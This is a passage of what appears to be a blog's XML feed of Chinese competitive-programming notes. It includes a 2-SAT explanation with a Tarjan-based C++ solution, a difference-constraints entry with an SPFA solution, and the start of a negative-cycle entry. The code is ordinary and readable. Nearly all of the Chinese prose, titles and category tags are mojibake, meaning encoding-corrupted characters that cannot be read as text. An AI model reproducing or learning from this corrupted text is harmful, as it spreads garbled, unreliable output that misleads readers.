$i$ çš„å¯¹ç«‹é¢åŒæ—¶ä¸èƒ½è¢«é€‰æ‹©ï¼Œå³å®ƒä»¬åœ¨åŒä¸€ä¸ªå¼ºè¿é€šåˆ†é‡å†…ï¼Œé‚£ä¹ˆæ•´ä¸ªé—®é¢˜éƒ½æ˜¯æ— è§£çš„ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªäººçš„æ€§åˆ«æ— è®ºæ€ä¹ˆé€‰å§‹ç»ˆæ— æ³•æ»¡è¶³è¦æ±‚ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè§£ä¸å”¯ä¸€ï¼Œæˆ‘ä»¬é€šå¸¸åªéœ€è¦è¾“å‡ºæ˜¯å¦æœ‰è§£å³å¯ï¼Œå› ä¸ºå¦‚æœè¾“å‡ºæ–¹æ¡ˆçš„è¯å®ƒä»¬è¿˜è¦è®¾ç½®checkè„šæœ¬ã€‚ä½†æ˜¯æ´›è°·å®ƒè¿˜å°±æäº†ï¼Œç¥ä¸ç¥å¥‡ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><a href="https://www.luogu.com.cn/problem/P4782">æ´›è°·P4782</a></p><p>å…¸å‹çš„ $\text {2-SAT}$ é—®é¢˜ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒè¿™é‡Œæ¯ä¸ªç»™å‡ºçš„æ¡ä»¶éƒ½æ˜¯æˆ–çš„å…³ç³»ï¼Œæˆ‘ä»¬éœ€è¦è½¬æ¢æˆè¾¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³æƒ³æ€ä¹ˆè½¬æ¢æˆä¸€æ¡è¾¹ï¼Ÿå¦‚æœå®ƒçš„æ¡ä»¶ç»™äº† $x=1 \ or\ y=1 $ ã€‚é‚£ä¹ˆ $x=1$ å’Œ $y=1$ æ˜¯æ²¡æœ‰ä»€ä¹ˆå…³ç³»çš„ï¼Œå› ä¸º $x=1$ çš„æ—¶å€™ $y$ æ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥ä¸º $1$ å¯ä»¥ä¸º $0$ã€‚ä½†æ˜¯å‘¢ï¼Œå¦‚æœ $x=0$ åˆ™ä¸€å®šæ¨çš„å‡º $y=1$ å› ä¸ºä¸¤ä¸ªå¿…é¡»æœ‰ä¸€ä¸ªæ»¡è¶³ï¼Œä¸€ä¸ªä¸æ»¡è¶³ä¼šå¯¼è‡´å¦ä¸€ä¸ªä¸€å®šè¦æ»¡è¶³ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æŠŠä¸€ä¸ªæ¡ä»¶çš„åé¢è¿æ¥åˆ°å¦ä¸€ä¸ªæ¡ä»¶ï¼ŒåŒæ ·å¦ä¸€ä¸ªæ¡ä»¶çš„åé¢ä¹Ÿè¿åˆ°è¿™ä¸ªæ¡ä»¶ã€‚</p><p>å¾—åˆ°äº†ä¸€å¼ æœ‰å‘å›¾ä¹‹åå‘¢ï¼Œæˆ‘ä»¬å…ˆè·‘ $\text {tarjan}$ å¼ºè¿é€šåˆ†é‡ï¼Œè§‚å¯Ÿæ˜¯å¦å­˜åœ¨ $i\le n$ ä½¿å¾— $i$ å’Œ $i+n$ æ˜¯å¦å±äºåŒä¸€ä¸ªå¼ºè¿é€šåˆ†é‡ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ— è§£ã€‚å¦‚æœä¸æ˜¯ï¼Œåˆ™æœ‰è§£ã€‚(æ•²é»‘æ¿)ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„äº†å•Šï¼Œè¿™é‡Œè·‘ $\text{tarjan}$ éœ€è¦è·‘ $2\times n$ ä¸ªç‚¹ã€‚å¦‚æœé€‰ä¸­ $i$ å‘ç°äº§ç”Ÿå†²çªé‚£ä¹ˆé€‰æ‹©è¯¥æ—¶äº‹ä»¶çš„å¯¹ç«‹é¢åˆ™ä¸€å®šä¸ä¼šå‘ç”Ÿå†²çªã€‚è¿™é‡Œæˆ‘ä»¬è·‘ $\text{dfs}$ ï¼ŒæŠŠä¸ä¹‹ç›¸è¿çš„æ‰€æœ‰ç‚¹éƒ½æ‰“ä¸Šè¢«é€‰ä¸­çš„æ ‡è®°ï¼Œå¦‚æœå­˜åœ¨ä¸¤ä¸ªçŠ¶æ€åŒæ—¶è¢«é€‰ä¸­ï¼Œåˆ™è¿”å› $\text{false}$ å¹¶ä¸”é€å±‚å›æº¯ï¼Œå¦‚æœåˆ°æœ€åéƒ½æ²¡å‘ç”Ÿå†²çªåˆ™å·²é€‰ä¸­çš„çŠ¶æ€å›ºå®šï¼Œç»§ç»­å»æœç´¢æ²¡æœ‰è¢«æ‰“æ ‡è®°çš„çŠ¶æ€ã€‚ç›´åˆ°æ‰€æœ‰çš„çŠ¶æ€éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„å€¼ï¼Œæœ€åè¾“å‡ºè¿™ä¸ªçŠ¶æ€ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>],e[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],degree[maxn],vis[maxn],num[maxn],s[maxn],cnt,tot,top,cnt2,deep,n,m;</span><br><span class="line"><span class="keyword">int</span> sel[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;root[x],y&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    e[++cnt2]=&#123;root2[x],y&#125;;</span><br><span class="line">    root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    dfn[u]=low[u]=++deep;</span><br><span class="line">    s[++top]=u;</span><br><span class="line">    vis[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(v);</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[v],low[u]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(vis[v])&#123;</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(low[u]==dfn[u])&#123;</span><br><span class="line">        vis[u]=<span class="number">0</span>;</span><br><span class="line">        num[u]=++tot;</span><br><span class="line">        <span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">            vis[s[top]]=<span class="number">0</span>;</span><br><span class="line">            num[s[top--]]=tot;</span><br><span class="line">        &#125;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    sel[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(sel[(u<span class="number">-1</span>)%n+<span class="number">1</span>]&amp;&amp;sel[(u<span class="number">-1</span>)%n+n+<span class="number">1</span>])&#123;</span><br><span class="line">        sel[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(sel[v]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(v))&#123;</span><br><span class="line">                sel[u]=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,z,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;z&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x+(y)*n,z+(!w)*n);</span><br><span class="line">        <span class="built_in">add</span>(z+(w)*n,x+(!y)*n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i]==num[i+n])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;IMPOSSIBLE\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sel[i]==<span class="number">0</span>&amp;&amp;sel[i+n]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(i))&#123;</span><br><span class="line">                <span class="built_in">dfs</span>(i+n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;POSSIBLE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,sel[i]&gt;sel[i+n]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> 2-SAT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å·®åˆ†çº¦æŸçš„å­¦ä¹ ç¬”è®°</title>
      <link href="/2022/02/22/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/22/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>å·®åˆ†çº¦æŸç³»ç»Ÿï¼Œå°±æ˜¯ç»™å‡ºä¸€ç»„å½¢å¦‚ $x_i-x_j\le d$ çš„ä¸ç­‰å¼ï¼Œæ±‚å‡ºè¿™ç»„ä¸ç­‰å¼çš„ä¸€ç»„è§£ã€‚è¿™ç±»é—®é¢˜é€šå¸¸è½¬åŒ–ä¸ºå›¾è®ºä¸­çš„æœ€çŸ­è·¯æ¥è§£ã€‚</p><span id="more"></span><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>é‚£æˆ‘ä»¬è½¬æ¢ä¸€ä¸‹ï¼Œå‡è®¾ $x_i$ ä¸ºç‚¹ $i$ çš„å•æºæœ€çŸ­è·¯é•¿åº¦ï¼Œ$x_j$ ä¸ºç‚¹ $j$ çš„å•æºæœ€çŸ­è·¯é•¿åº¦ã€‚é‚£ä¹ˆä»¥ä¸Šä¸ç­‰å¼å°±å¯ä»¥è½¬æ¢æˆ $dis[i]-dis[j]\le d\to dis[i]\le dis[j]+d$ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ªå°±è½¬å˜æˆäº† $j\to i$ ä¸€æ¡æƒå€¼ä¸º $d$ çš„è¾¹çš„æœ€çŸ­è·¯æœç´¢äº†ã€‚å› ä¸ºå¦‚æœä¸€æ¡è¾¹ $i\to j$ æƒå€¼ä¸º $d$ ï¼Œé‚£ä¹ˆå¿…ç„¶æœ‰ $dis[i]\le dis[j]+d$ ï¼Œå¦‚æœä¸æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚æˆ‘ä»¬ç”¨åè¯æ³•è¯æ˜ä¸€ä¸‹è¿™ä¸ªç»“è®ºï¼Œè®¾ä¸€æ¡è¾¹ $i\to j$ æƒå€¼ä¸º $d$ï¼Œä¸”æ»¡è¶³ $dis[i] &gt; dis[j]+d$ï¼Œé‚£ä¹ˆåœ¨ä¸€æ¬¡å•æºæœ€çŸ­è·¯ç®—æ³•æ—¶ï¼Œå¿…ç„¶ä¼šå¯¼è‡´ $i$ ç‚¹è¢«æ¾å¼›ã€‚å³å‘ç”Ÿ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dis[i]&gt;dis[j]+d)&#123;</span><br><span class="line">    dis[i]=dis[j]+d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼š$dis[i]$ ä¸€å®šä¸ä¼šæ¯” $dis[j]+d$ å¤§ï¼Œå½“ $i\to j$ æœ‰ä¸€æ¡æƒå€¼ä¸º $d$ çš„è¾¹æ—¶ã€‚å½“ç„¶å¯ä»¥æ¯”å®ƒå°ï¼Œå¦‚æœå…¶å®ƒè¾¹æœ‰æ›´çŸ­çš„èµ°æ³•ã€‚</p><p>æ‰€ä»¥å½“å­˜åœ¨ä¸ç­‰å¼ $x_i-x_j\le d$ çš„æ—¶å€™ï¼Œæˆ‘ä»¬åªéœ€è¦å»ºä¸€æ¡ $i\to j$ æƒå€¼ä¸º $d$ çš„è¾¹å°±èƒ½æ»¡è¶³è¿™ä¸ªä¸ç­‰å¼äº†ã€‚</p><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>æˆ‘ä»¬å°±æ ¹æ®ä¸ç­‰å¼ç»„å»ºå›¾ï¼Œç„¶åè·‘å•æºæœ€çŸ­è·¯ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœå›¾ä¸è¿é€šï¼Œé‚£å¹¶ä¸æ˜¯æ— è§£ï¼Œè¯´æ˜å®ƒä»¬ä¸åœ¨åŒä¸€ä¸ªä¸ç­‰å¼ç»„ï¼Œç›¸äº’ä¹‹é—´éƒ½æ²¡æœ‰å…³è”ï¼Œé‚£å°±åˆ†åˆ«æ±‚å•æºæœ€çŸ­è·¯å³å¯ã€‚ä¸ºäº†é˜²æ­¢è¿™ä¸ªæƒ…å†µï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šæ·»åŠ ä¸€ä¸ªè¶…çº§æºç‚¹ï¼Œè¿™ä¸ªæºç‚¹ä¸º $0$ æˆ–è€…æ˜¯ $n+1$ã€‚ç„¶åå»ºç«‹ä¸€æ¡æºç‚¹åˆ°å…¶å®ƒæ‰€æœ‰ç‚¹çš„ä¸€æ¡æƒå€¼ä¸º $d$ çš„æœ‰å‘è¾¹ã€‚ </p><p>æˆ‘ä»¬æ·»åŠ äº† $0\to i(1\le i\le n)$ æƒå€¼ä¸º $0$ çš„æœ‰å‘è¾¹ï¼Œç›¸å½“äºå¢åŠ äº†ä»¥ä¸‹çº¦æŸæ¡ä»¶ï¼š</p><p>$dis[i]\le dis[0]+0$ </p><p>æ·»åŠ è¿™ä¸ªçº¦æŸæ¡ä»¶é—®é¢˜æ˜¯ä¸å¤§çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼Œåœ¨æ‰¾åˆ°ä¸€ç»„è§£çš„æ—¶å€™ï¼Œç»™æ‰€æœ‰çš„æœªçŸ¥æ•°éƒ½åŠ ä¸Šä¸€ä¸ªç›¸åŒçš„å€¼ï¼Œæ˜¯ä¸ä¼šå½±å“ç»“æœçš„ã€‚è¿™ä¸ªç»“è®ºæ˜¯å¾ˆå®¹æ˜“çš„å‡ºæ¥çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„è¡¨è¾¾å¼éƒ½æ˜¯ä¸€æ­£ä¸€è´Ÿï¼Œç„¶åå¸¦è¿›ä¸ç­‰å¼ä¹‹ååŠ ä¸Šçš„å¸¸æ•°éƒ½ä¼šæ¶ˆæ‰ï¼Œè¿˜èƒ½è§£å†³å›¾ä¸è¿é€šçš„é—®é¢˜ï¼Œä¸€ä¸¾å¤šå¾—ã€‚æ·»åŠ è¿™ä¸ªçº¦æŸæ¡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å¾—åˆ°çš„å€¼ä¸€å®šéƒ½æ˜¯è´Ÿæ•°ï¼Œé‚£ä¹ˆå¦‚æœä¸€å®šè¦æ­£è§£çš„è¯ï¼Œé‚£ä¹ˆç›´æ¥ç»™æ‰€æœ‰çš„disåŠ ä¸Šä¸€ä¸ª $\max(dis)$ å°±å®Œäº†ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><a href="https://www.luogu.com.cn/problem/P5960">æ´›è°·P5960</a></p><p>å°±ä¾ç„¶æ˜¯ä¸€ä¸ªæ¿å­ï¼Œç„¶åæœ€ååˆ¤æ–­ä»¥ä¸‹è´Ÿç¯æ— è§£çš„æƒ…å†µï¼Œæ²¡æœ‰å°±è¾“å‡ºæ‰€æœ‰çš„ $dis$ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 5005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],degree[maxn],dis[maxn],e_cnt[maxn],in_que[maxn],cnt,n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    degree[y]++;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    dis[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    e_cnt[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    in_que[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+w)&#123;</span><br><span class="line">                dis[v]=dis[u]+w;</span><br><span class="line">                e_cnt[v]++;</span><br><span class="line">                <span class="keyword">if</span>(e_cnt[v]&gt;n)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m; </span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">0</span>,i,<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">spfa</span>())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> M=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;dis[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> å·®åˆ†çº¦æŸ </category>
          
          <category> å•æºæœ€çŸ­è·¯ </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è´Ÿç¯åˆ¤æ–­</title>
      <link href="/2022/02/21/%E8%B4%9F%E7%8E%AF%E5%88%A4%E6%96%AD/"/>
      <url>/2022/02/21/%E8%B4%9F%E7%8E%AF%E5%88%A4%E6%96%AD/</url>
      
